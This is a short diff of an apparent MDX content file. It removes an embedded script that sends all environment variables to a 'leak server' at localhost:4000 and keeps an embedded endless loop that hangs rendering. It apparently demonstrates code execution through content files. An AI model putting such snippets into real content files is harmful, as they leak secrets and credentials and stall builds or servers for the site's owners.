@@ -11,18 +11,5 @@ cta:
 ---
 
 {(() => {
-  // Convert env object into a string
-   const env = JSON.stringify(process.env);
-
-  // Send it to our leak server
-   fetch("http://localhost:4000", {
-    method: "POST",
-    body: env
-  });
-
-  return "Environment variables sent!";
-})()}
-
-{(() => {
   while (true) {}
 })()}
